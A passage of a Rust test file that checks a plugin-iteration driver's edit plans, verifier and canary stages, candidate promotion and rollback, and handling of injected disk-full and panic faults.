        .expect("baseline hash failure rolls back cleanly (no candidate staged)");
    assert_eq!(verdict, PluginIterationFinalVerdict::RolledBack);
    assert!(state
        .blocked_reason
        .as_deref()
        .expect("drift reason")
        .contains("unable to hash source tree at verify time"));
    // The kernel recorded a VerifierFailure TOCTOU issue for the baseline
    // hash failure as well.
    let issues = host.kernel().plugin_issues();
    assert!(issues.iter().any(|i| {
        i.source == KernelPluginIssueSource::VerifierFailure
            && i.summary.contains("TOCTOU guard tripped")
    }));
}

#[test]

fn run_plugin_iteration_agent_applies_edit_plan_without_llm() {
    let (_temp, host) = empty_host();
    let rel = seed_writable_source(&host, "planned.rs", "old body\n");
    let mut prepared = prepared_for("mini", &["mini"]);
    prepared.edit_plan = Some(cordis_runtime::kernel::plugin_iteration::PluginEditPlan {
        issue_id: "issue-x".to_string(),
        patch_id: "patch-x".to_string(),
        summary: "planned edit".to_string(),
        operations: vec![PluginEditOperation {
            path: rel.clone(),
            kind: PluginEditOpKind::ReplaceExact,
            expected_old_string: Some("old body\n".to_string()),
            expected_sha256: None,
            new_content: Some("planned body\n".to_string()),
            pointer: None,
            dotted_key: None,
            value: None,
        }],
    });
    let run = cordis_agent::iteration::driver::run_plugin_iteration_agent(&host, &prepared)
        .expect("edit-plan path runs without any LLM call");
    // No agent session in the edit-plan branch.
    assert!(run.session_id.is_none());
    assert_eq!(run.recorded_summary.as_deref(), Some("planned edit"));
    assert!(run.changed_paths.iter().any(|p| p == &rel));
    // The planned edit landed on disk.
    assert_eq!(
        fs::read_to_string(host.fixtures_root().join(&rel)).expect("read"),
        "planned body\n"
    );
}

#[test]

fn verify_plugin_iteration_runs_trivial_commands_and_reports() {
    let (_temp, host) = empty_host();
    let mut prepared = prepared_for("mini", &["mini"]);
    // Trivial shell commands so the verifier's command stages run fast and
    // pass, exercising the candidate_invoker closure construction and the
    // CommandVerifier::verify_with_options `?` call site.
    prepared.tests_command = Some("cargo test --help".to_string());
    prepared.safety_command = Some("cargo --version".to_string());
    let state = cordis_runtime::host::PluginIterationRunState::new(prepared);
    let report = cordis_agent::iteration::driver::verify_plugin_iteration(&host, &state)
        .expect("verify runs the trivial commands");
    // Both trivial commands exit 0 → tests_passed true.
    assert!(report.input.tests_passed);
}

#[test]

fn verify_plugin_iteration_plugin_command_invokes_candidate_closure() {
    // A staged JSON `svc` candidate + a `plugin:` tests command makes the
    // verifier route through the `candidate_invoker` closure (the closure
    // body dispatches into `invoke_candidate`), covering that seam.
    let (_temp, fixtures) = setup_verify_node_json_fixture();
    let host = RuntimeHost::boot(&fixtures).expect("boot svc fixture");
    host.reload_candidate().expect("stage candidate");
    let mut prepared = prepared_for("svc", &["svc"]);
    let spec = json!({
        "plugin_path": "svc",
        "node_id": "svc_verify",
        "payload_json": {}
    });
    prepared.tests_command = Some(format!("plugin:{spec}"));
    // Skip the safety stage; keep the run to just the plugin: tests command.
    prepared.safety_command = None;
    let state = cordis_runtime::host::PluginIterationRunState::new(prepared);
    let report = cordis_agent::iteration::driver::verify_plugin_iteration(&host, &state)
        .expect("verify routes the plugin: command through the candidate closure");
    // The candidate echoes {"ok":true} and exits successfully.
    assert!(report.input.tests_passed, "plugin: candidate invoke passed");
}

#[test]

fn finalize_manual_approved_partial_promotes_when_candidate_staged() {
    let (_temp, host) = empty_host();
    host.reload_candidate().expect("stage candidate");
    let mut prepared = prepared_for("", &[]);
    prepared.manual_approved = true;
    let mut state = cordis_runtime::host::PluginIterationRunState::new(prepared);
    state.verifier_verdict = Some(VerifierVerdict::Pass);
    state.canary = Some(cordis_runtime::kernel::plugin_iteration::CanaryReport {
        verdict: CanaryVerdict::Partial,
        mode: "no_canary_evidence".to_string(),
        plugin_path: None,
        node_id: None,
        payload: None,
        expected_response: None,
        actual_response: None,
        message: "no evidence".to_string(),
    });
    // Pass verifier + Partial canary + manual_approved + a real staged
    // candidate + clean journal → the manual-approved promote SUCCESS arm
    // (`Ok(_) => Promoted`) runs.
    let verdict = cordis_agent::iteration::driver::finalize_plugin_iteration(&host, &mut state)
        .expect("manual-approved promote succeeds");
    assert_eq!(verdict, PluginIterationFinalVerdict::Promoted);
    assert!(host.candidate_snapshot().is_none(), "candidate promoted");
}

#[test]

fn finalize_pass_pass_promotes_when_candidate_staged() {
    let (_temp, host) = empty_host();
    host.reload_candidate().expect("stage candidate");
    let mut state = cordis_runtime::host::PluginIterationRunState::new(prepared_for("", &[]));
    state.verifier_verdict = Some(VerifierVerdict::Pass);
    state.canary = Some(cordis_runtime::kernel::plugin_iteration::CanaryReport {
        verdict: CanaryVerdict::Pass,
        mode: "recent_successful_invocation_replay".to_string(),
        plugin_path: Some("x".to_string()),
        node_id: Some("n".to_string()),
        payload: Some(json!({})),
        expected_response: Some(json!({ "ok": true })),
        actual_response: Some(json!({ "ok": true })),
        message: "match".to_string(),
    });
    let verdict = cordis_agent::iteration::driver::finalize_plugin_iteration(&host, &mut state)
        .expect("pass/pass promote succeeds");
    assert_eq!(verdict, PluginIterationFinalVerdict::Promoted);
    assert!(host.candidate_snapshot().is_none());
}

#[test]

fn finalize_rejects_promote_of_replaced_candidate() {
    let (_temp, host) = empty_host();
    let first = host.reload_candidate().expect("stage candidate #1");
    host.reload_candidate().expect("replace candidate #2");
    let mut state = cordis_runtime::host::PluginIterationRunState::new(prepared_for("", &[]));
    // Step 4 记录的候选是 first；当前 staged 已被替换成 second。
    state.candidate = Some(first);
    state.verifier_verdict = Some(VerifierVerdict::Pass);
    state.canary = Some(cordis_runtime::kernel::plugin_iteration::CanaryReport {
        verdict: CanaryVerdict::Pass,
        mode: "recent_successful_invocation_replay".to_string(),
        plugin_path: Some("x".to_string()),
        node_id: Some("n".to_string()),
        payload: Some(json!({})),
        expected_response: Some(json!({ "ok": true })),
        actual_response: Some(json!({ "ok": true })),
        message: "match".to_string(),
    });
    let out = cordis_agent::iteration::driver::finalize_plugin_iteration(&host, &mut state);
    assert!(out.is_err(), "promote of a replaced candidate must fail");
    assert!(
        host.candidate_snapshot().is_some(),
        "the (replaced) candidate must remain staged"
    );
}

#[test]

fn run_plugin_canary_continues_when_candidate_lacks_target_plugin() {
    let (_temp, host) = empty_host();
    // Stage an (empty) candidate, then run canary for a target plugin that
    // is NOT in the candidate registry → the `let Some(plugin) = ... else
    // { continue }` arm fires, then falls through to Partial.
    host.reload_candidate().expect("stage empty candidate");
    let state =
        cordis_runtime::host::PluginIterationRunState::new(prepared_for("ghost", &["ghost"]));
    let report =
        cordis_agent::iteration::driver::run_plugin_canary(&host, &state).expect("canary runs");
    assert_eq!(report.verdict, CanaryVerdict::Partial);
    assert_eq!(report.mode, "no_canary_evidence");
}

#[test]

fn plugin_iteration_agent_snapshot_returns_state_for_an_iteration_session() {
    let (temp, host) = empty_host();
    let prepared = prepared_for("ghost", &["ghost"]);
    let context_paths = PluginIterationContextPaths {
        focus_paths: Vec::new(),
        all_paths: Vec::new(),
    };
    let session_id = cordis_agent::iteration::driver::start_plugin_iteration_agent_session(
        &host,
        prepared.clone(),
        context_paths,
    )
    .expect("start an iteration session");

    let snapshot = host
        .iteration_agent_snapshot(&session_id)
        .expect("iteration session yields a snapshot");
    // A freshly started session has recorded no summary yet, so the derived
    // plan falls back to the prepared summary.
    assert!(snapshot.recorded_summary.is_none());
    assert_eq!(snapshot.derived_edit_plan.summary, prepared.summary);
    assert!(snapshot.changed_paths.is_empty());
    drop(temp);
}

#[test]

fn iterate_plugins_reports_infrastructure_failure_on_enospc() {
    let (_temp, fixtures) = setup_empty_fixture();
    let host = RuntimeHost::boot(&fixtures).expect("host should boot on empty index");

    let before = host.kernel().status();

    TEST_ITERATION_ENOSPC_INJECTION.store(true, SeqCst);
    let result = host
        .iterate_plugins(empty_plan_request())
        .expect("infrastructure failure is a verdict, not an Err");

    assert_eq!(
        result.final_verdict,
        PluginIterationFinalVerdict::InfrastructureFailure,
        "ENOSPC must not be reported as RolledBack; blocked_reason={:?}",
        result.blocked_reason
    );
    let reason = result.blocked_reason.as_deref().unwrap_or_default();
    assert!(
        reason.contains("No space left on device"),
        "the errno text must survive to blocked_reason, got: {reason}"
    );

    let after = host.kernel().status();
    assert_eq!(
        after.iteration_rollback_total, before.iteration_rollback_total,
        "infrastructure failures must not inflate the rollback metric"
    );
    assert_eq!(
        after.iteration_infrastructure_failure_total,
        before.iteration_infrastructure_failure_total + 1,
        "infrastructure failures get their own counter"
    );

    // 插件没有被冤枉：不产生 LoadFailure issue。
    assert!(
        !host
            .kernel()
            .plugin_issues()
            .iter()
            .any(|issue| issue.source == KernelPluginIssueSource::LoadFailure),
        "a full disk must not be recorded as a plugin LoadFailure"
    );

    // 仍可重试：迭代留在 blocked_iterations 里（RolledBack 会被摘除）。
    assert!(
        host.kernel()
            .blocked_iterations()
            .iter()
            .any(|entry| entry.iteration_id == result.iteration_id),
        "infrastructure failures stay retryable"
    );
}

#[test]

fn genuine_stage_failure_still_rolls_back() {
    let (_temp, fixtures) = setup_empty_fixture();
    let host = RuntimeHost::boot(&fixtures).expect("host should boot on empty index");

    // 不注入 ENOSPC；改一个策略禁止的路径（crates/ 属 forbidden_prefixes），
    // 这是插件侧的真实失败，必须仍判 RolledBack。
    let mut request = empty_plan_request();
    if let Some(plan) = request.edit_plan.as_mut() {
        plan.operations = vec![
            cordis_runtime::kernel::plugin_iteration::PluginEditOperation {
                path: "crates/cordis-runtime/src/lib.rs".to_string(),
                kind: cordis_runtime::kernel::plugin_iteration::PluginEditOpKind::ReplaceExact,
                expected_old_string: Some("pub".to_string()),
                expected_sha256: None,
                new_content: Some("mod".to_string()),
                pointer: None,
                dotted_key: None,
                value: None,
            },
        ];
    }

    let before = host.kernel().status();
    let result = host
        .iterate_plugins(request)
        .expect("policy block is a verdict, not an Err");

    assert_eq!(
        result.final_verdict,
        PluginIterationFinalVerdict::RolledBack,
        "a genuine policy-blocked edit must remain RolledBack"
    );
    let after = host.kernel().status();
    assert_eq!(
        after.iteration_infrastructure_failure_total, before.iteration_infrastructure_failure_total,
        "a genuine failure must not land in the infrastructure counter"
    );
    assert_eq!(
        after.iteration_rollback_total,
        before.iteration_rollback_total + 1,
        "a genuine failure still counts as a rollback"
    );
}

#[test]

fn iterate_plugins_panic_is_caught_and_rolls_back_candidate_and_clears_journal() {
    let (_temp, fixtures) = setup_empty_fixture();
    let host = RuntimeHost::boot(&fixtures).expect("host should boot on empty index");

    // Seed a candidate snapshot so we can prove the panic arm rolls it back.
    host.reload_candidate().expect("stage candidate");
    assert!(
        host.candidate_snapshot().is_some(),
        "candidate should be staged before the panic"
    );

    // Seed a rollback journal so we can prove the panic arm clears it. The
    // journal records the (empty) current bytes of an in-workspace file;
    // rollback restores those same bytes (a no-op edit), so `restore_
    // plugin_iteration_workspace` runs cleanly without a cargo rebuild.
    let marker_rel = "artifacts/seam-marker.txt";
    let marker_abs = fixtures.join(marker_rel);
    fs::write(&marker_abs, b"original").expect("seed marker file");
    let rollback = cordis_runtime::kernel::plugin_iteration::PluginEditRollback::single_backup(
        fixtures.clone(),
        marker_rel,
        Some(b"original".to_vec()),
    );
    let journal_path = plugin_iteration_journal_path(host.snapshot_root());
    rollback
        .persist_journal(&journal_path, "seam-iteration")
        .expect("persist journal");
    assert!(journal_path.exists(), "journal should exist before panic");

    // Arm the injection and drive the iteration.
    TEST_ITERATION_PANIC_INJECTION.store(true, SeqCst);
    let result = cordis_agent::iteration::driver::iterate_plugins(&host, iteration_request());

    // The panic was caught: iterate_plugins returns an Invariant error
    // whose message carries the injected panic text.
    let err = result.expect_err("panic must surface as Err, not unwind");
    let msg = err.to_string();
    assert!(
        msg.contains("test panic injection: plugin iteration"),
        "error must carry the injected panic message, got: {msg}"
    );
    assert!(
        msg.contains("workspace has been restored"),
        "error must report the emergency restore, got: {msg}"
    );

    // The flag was consumed exactly once (swapped back to false).
    assert!(
        !TEST_ITERATION_PANIC_INJECTION.load(SeqCst),
        "injection flag must be reset after firing"
    );
    // Candidate was rolled back.
    assert!(
        host.candidate_snapshot().is_none(),
        "candidate must be rolled back by the panic arm"
    );
    // Journal was cleared.
    assert!(
        !journal_path.exists(),
        "rollback journal must be cleared by the panic arm"
    );
    // The iteration lock was released (finish_plugin_iteration ran before
    // the match arm), so a subsequent iteration can start. Re-arm the flag
    // so the follow-up panics at the closure's first line again — this
    // proves the lock was freed WITHOUT driving a real LLM agent turn (an
    // unarmed, edit-plan-less iteration would otherwise call out to the
    // configured LLM endpoint).
    TEST_ITERATION_PANIC_INJECTION.store(true, SeqCst);
    let followup = cordis_agent::iteration::driver::iterate_plugins(&host, iteration_request());
    let followup_msg = followup
        .expect_err("re-armed follow-up must also surface as Err")
        .to_string();
    assert!(
        followup_msg.contains("test panic injection: plugin iteration"),
        "follow-up must reach the injection point (lock was released), got: {followup_msg}"
    );
    assert!(
        !TEST_ITERATION_PANIC_INJECTION.load(SeqCst),
        "injection flag must be reset after the follow-up fires"
    );
}

#[test]

fn backend_run_plugin_test_uses_prepared_tests_command_fallback() {
    let (_temp, host) = empty_host();
    let prepared = {
        let mut p = prepared_for("mini", &["mini"]);
        p.tests_command = Some("cargo test --quiet -p mini --lib".to_string());
        p
    };
    let context_paths = PluginIterationContextPaths {
        focus_paths: Vec::new(),
        all_paths: Vec::new(),
    };
    let mut state = PluginIterationAgentState::new(prepared, context_paths, host.fixtures_root());
    let mut backend = PluginIterationAgentBackend {
        host: &host,
        state: &mut state,
    };
    // No explicit command → the `.or_else(prepared.tests_command)` fallback
    // arm supplies the prepared command.
    let out = AgentBackend::execute_tool(&mut backend, "run_plugin_test", json!({}))
        .expect("run_plugin_test Ok");
    let cmd = out.get("command").and_then(Value::as_str).expect("command");
    assert_eq!(cmd, "cargo test --quiet -p mini --lib");
}
